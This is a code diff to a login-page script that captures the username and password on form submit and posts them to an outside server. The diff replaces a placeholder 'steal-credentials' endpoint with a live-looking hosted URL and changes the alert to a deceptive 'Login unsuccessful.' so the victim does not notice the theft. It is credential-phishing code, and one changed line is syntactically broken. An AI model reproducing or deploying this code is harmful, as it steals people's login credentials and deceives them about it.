@@ -4,13 +4,14 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
   const password = document.getElementById("password").value;
 
   // Send credentials to your server (replace with your server URL)
-  fetch("https://yourserver.com/steal-credentials", {
+  fetch("https://nono-8w3s.onrender.com", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ username, password })
+    body: JSON.stringify({ email or moblie number, password })
   });
 
-  alert("Login successful! Your credentials have been stolen.");
+  alert("Login unsuccessful.");
+
 });
